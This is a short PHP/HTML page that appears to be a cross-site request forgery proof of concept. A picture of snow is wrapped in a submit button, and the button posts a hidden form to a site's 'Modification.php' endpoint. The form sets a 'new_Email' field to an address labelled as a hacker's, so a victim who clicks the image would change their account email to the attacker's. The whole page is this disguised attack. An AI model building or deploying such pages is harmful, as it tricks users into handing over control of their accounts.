<?php


?>


<!DOCTYPE html>
<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        .container {
            position: relative;
            width: 100%;
            max-width: 400px;
        }

        .container img {
            width: 100%;
            height: auto;
        }

        .container .btn {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            -ms-transform: translate(-50%, -50%);
            background-color: #555;
            color: white;
            font-size: 16px;
            padding: 12px 24px;
            border: none;
            cursor: pointer;
            border-radius: 5px;
            text-align: center;
        }

        .container .btn:hover {
            background-color: black;
        }
    </style>
</head>

<body>
    <form action="projects/includes/Modification.php" method="POST">
        <input type="hidden" name="new_Email" value="hacker3432email@gmail.com">


        <div class="container">

            <button name="submit"><img src="img_snow.jpg" alt="Snow" style="width:100%"></button>
        </div>

    </form>

</body>

</html>